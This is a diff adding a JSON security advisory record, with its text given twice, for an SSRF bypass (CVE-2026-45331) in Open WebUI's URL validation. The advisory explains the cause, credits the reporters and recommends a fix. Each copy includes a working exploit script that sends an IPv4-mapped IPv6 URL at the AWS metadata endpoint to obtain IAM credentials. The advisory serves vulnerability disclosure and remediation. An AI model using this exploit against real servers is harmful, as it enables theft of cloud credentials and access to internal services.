@@ -1,0 +1,100 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-45331",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "# SSRF Bypass via IPv6/IPv4-mapped IPv6/IPv4-reserved-ranges in `validate_url()`\n\n## Summary\n\n`validate_url()` in `backend/open_webui/retrieval/web/utils.py` calls `validators.ipv6(ip, private=True)`, but the `validators` library does NOT implement the `private` keyword for IPv6 - the call raises a `ValidationError` (which is falsy in a boolean context), so every IPv6 address passes the filter. In addition, IPv4-mapped IPv6 (`::ffff:10.0.0.1`) bypasses the IPv4 check entirely, and several reserved IPv4 ranges (`0.0.0.0/8`, `100.64.0.0/10`, `192.0.0.0/24`, etc.) are not blocked.\n\nThe vulnerability has existed since the `validate_url()` function was introduced and was NOT actually fixed by GHSA-c6xv-rcvw-v685 / CVE-2025-65958 despite that patch's intent. It affects every endpoint that calls `validate_url()`, including `/api/v1/retrieval/process/web`, `/api/v1/images/edit`, and others.\n\n## Affected code\n\n`backend/open_webui/retrieval/web/utils.py validate_url()`:\n\n```python\nif validators.ipv6(ip, private=True):  # ValidationError is falsy - never raises\n    raise ValueError(...)\n```\n\n## Proof of concept\n\n```python\nimport validators\nprint(validators.ipv6(\"::1\", private=True))\n# ValidationError(func=ipv6, args={'reason': \"ipv6() got an unexpected keyword argument 'private'\", ...})\n```\n\nEnd-to-end exploit:\n\n```python\nimport requests, ipaddress\n\nOPEN_WEBUI_URL = \"https://target\"\nTOKEN = \"...\"\nTARGET_IPV4 = \"169.254.169.254\"   # AWS IMDSv1\nmapped = \"::ffff:\" + TARGET_IPV4\n\nrequests.post(f\"{OPEN_WEBUI_URL}/api/v1/retrieval/process/web\",\n              headers={\"Authorization\": f\"Bearer {TOKEN}\"},\n              json={\"collection_name\": \"\", \"url\": f\"http://[{mapped}]/latest/meta-data/iam/security-credentials/\"})\n```\n\n## Impact\n\nAny authenticated user can reach any internal IPv4/IPv6 address from the server process - cloud metadata, localhost-bound APIs, internal services. IMDSv1 reachability leads to IAM credential exfiltration.\n\n## Recommended fix\n\nReplace the `validators` library calls with stdlib `ipaddress`:\n\n```python\nimport ipaddress\naddr = ipaddress.ip_address(ip)\nif addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved or addr.is_unspecified:\n    raise ValueError(...)\n# also unwrap IPv4-mapped IPv6 and re-check:\nif isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:\n    addr_v4 = addr.ipv4_mapped\n    if addr_v4.is_private or addr_v4.is_loopback or ...:\n        raise ValueError(...)\n# plus explicit blocks for IANA reserved ranges (0.0.0.0/8, 100.64.0.0/10, etc. - see body for full list).\n```\n\n## Related but separate advisories\n\n- Redirect-bypass cluster: GHSA-rh5x-h6pp-cjj6\n- DNS rebinding TOCTOU: GHSA-h6x2-583h-x99r\n- urlparse / requests parsing-differential: GHSA-8w7q-q5jp-jvgx\n- Playwright loader redirect: GHSA-jrfp-m64g-pcwv\n- Missing `validate_url()` call in image_generations: GHSA-h7cc-wwjp-5xqh\n\n## Credits\n\n- **Dor Konis (dkonis, GE Vernova)** - first to identify the `validators.ipv6(private=True)` silent-fail and IPv4-mapped IPv6 bypass; GHSA-4v7r-f4w8-8972 (this filing, 2024-09-11; credit explicitly requested in original report).\n- **wlayzz** - first to identify the unblocked IPv4 reserved ranges (0.0.0.0/8, 100.64.0.0/10, 192.0.2.0/24, 198.18.0.0/15, 203.0.113.0/24, etc.); GHSA-pxgj-3gvh-mfjv.\n\nSubsequent filings (GHSA-mggf-94hh-vp4w by vnth4nhnt, GHSA-xhgr-g5q7-jg6p by L1M1T-HACK) re-described the same root cause on the same or different endpoints and were closed as duplicates without advisory credit - fixing `validate_url()` once resolves all of them.",
+    "ghsa_id": "GHSA-4v7r-f4w8-8972",
+    "html_url": "https://github.com/advisories/GHSA-4v7r-f4w8-8972",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4v7r-f4w8-8972"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45331"
+      }
+    ],
+    "published_at": "2026-05-14T20:18:54Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-4v7r-f4w8-8972",
+      "https://github.com/advisories/GHSA-c6xv-rcvw-v685",
+      "https://github.com/open-webui/open-webui/releases/tag/v0.9.0",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-45331",
+      "https://github.com/advisories/GHSA-4v7r-f4w8-8972"
+    ],
+    "severity": "high",
+    "summary": "Open WebUI has a full SSRF Vulnerability in the RAG Web Search Feature",
+    "updated_at": "2026-05-15T23:53:50Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.0",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.8.12"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-4v7r-f4w8-8972",
+  "repo": {
+    "cve_id": "CVE-2026-45331",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "# SSRF Bypass via IPv6/IPv4-mapped IPv6/IPv4-reserved-ranges in `validate_url()`\r\n\r\n## Summary\r\n\r\n`validate_url()` in `backend/open_webui/retrieval/web/utils.py` calls `validators.ipv6(ip, private=True)`, but the `validators` library does NOT implement the `private` keyword for IPv6 - the call raises a `ValidationError` (which is falsy in a boolean context), so every IPv6 address passes the filter. In addition, IPv4-mapped IPv6 (`::ffff:10.0.0.1`) bypasses the IPv4 check entirely, and several reserved IPv4 ranges (`0.0.0.0/8`, `100.64.0.0/10`, `192.0.0.0/24`, etc.) are not blocked.\r\n\r\nThe vulnerability has existed since the `validate_url()` function was introduced and was NOT actually fixed by GHSA-c6xv-rcvw-v685 / CVE-2025-65958 despite that patch's intent. It affects every endpoint that calls `validate_url()`, including `/api/v1/retrieval/process/web`, `/api/v1/images/edit`, and others.\r\n\r\n## Affected code\r\n\r\n`backend/open_webui/retrieval/web/utils.py validate_url()`:\r\n\r\n```python\r\nif validators.ipv6(ip, private=True):  # ValidationError is falsy - never raises\r\n    raise ValueError(...)\r\n```\r\n\r\n## Proof of concept\r\n\r\n```python\r\nimport validators\r\nprint(validators.ipv6(\"::1\", private=True))\r\n# ValidationError(func=ipv6, args={'reason': \"ipv6() got an unexpected keyword argument 'private'\", ...})\r\n```\r\n\r\nEnd-to-end exploit:\r\n\r\n```python\r\nimport requests, ipaddress\r\n\r\nOPEN_WEBUI_URL = \"https://target\"\r\nTOKEN = \"...\"\r\nTARGET_IPV4 = \"169.254.169.254\"   # AWS IMDSv1\r\nmapped = \"::ffff:\" + TARGET_IPV4\r\n\r\nrequests.post(f\"{OPEN_WEBUI_URL}/api/v1/retrieval/process/web\",\r\n              headers={\"Authorization\": f\"Bearer {TOKEN}\"},\r\n              json={\"collection_name\": \"\", \"url\": f\"http://[{mapped}]/latest/meta-data/iam/security-credentials/\"})\r\n```\r\n\r\n## Impact\r\n\r\nAny authenticated user can reach any internal IPv4/IPv6 address from the server process - cloud metadata, localhost-bound APIs, internal services. IMDSv1 reachability leads to IAM credential exfiltration.\r\n\r\n## Recommended fix\r\n\r\nReplace the `validators` library calls with stdlib `ipaddress`:\r\n\r\n```python\r\nimport ipaddress\r\naddr = ipaddress.ip_address(ip)\r\nif addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved or addr.is_unspecified:\r\n    raise ValueError(...)\r\n# also unwrap IPv4-mapped IPv6 and re-check:\r\nif isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:\r\n    addr_v4 = addr.ipv4_mapped\r\n    if addr_v4.is_private or addr_v4.is_loopback or ...:\r\n        raise ValueError(...)\r\n# plus explicit blocks for IANA reserved ranges (0.0.0.0/8, 100.64.0.0/10, etc. - see body for full list).\r\n```\r\n\r\n## Related but separate advisories\r\n\r\n- Redirect-bypass cluster: GHSA-rh5x-h6pp-cjj6\r\n- DNS rebinding TOCTOU: GHSA-h6x2-583h-x99r\r\n- urlparse / requests parsing-differential: GHSA-8w7q-q5jp-jvgx\r\n- Playwright loader redirect: GHSA-jrfp-m64g-pcwv\r\n- Missing `validate_url()` call in image_generations: GHSA-h7cc-wwjp-5xqh\r\n\r\n## Credits\r\n\r\n- **Dor Konis (dkonis, GE Vernova)** - first to identify the `validators.ipv6(private=True)` silent-fail and IPv4-mapped IPv6 bypass; GHSA-4v7r-f4w8-8972 (this filing, 2024-09-11; credit explicitly requested in original report).\r\n- **wlayzz** - first to identify the unblocked IPv4 reserved ranges (0.0.0.0/8, 100.64.0.0/10, 192.0.2.0/24, 198.18.0.0/15, 203.0.113.0/24, etc.); GHSA-pxgj-3gvh-mfjv.\r\n\r\nSubsequent filings (GHSA-mggf-94hh-vp4w by vnth4nhnt, GHSA-xhgr-g5q7-jg6p by L1M1T-HACK) re-described the same root cause on the same or different endpoints and were closed as duplicates without advisory credit - fixing `validate_url()` once resolves all of them.",
+    "ghsa_id": "GHSA-4v7r-f4w8-8972",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-4v7r-f4w8-8972",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4v7r-f4w8-8972"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45331"
+      }
+    ],
+    "published_at": "2026-05-09T12:07:36Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Full SSRF Vulnerability in the RAG Web Search Feature",
+    "updated_at": "2026-05-12T00:48:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.0",
+        "vulnerable_version_range": "<= 0.8.12"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
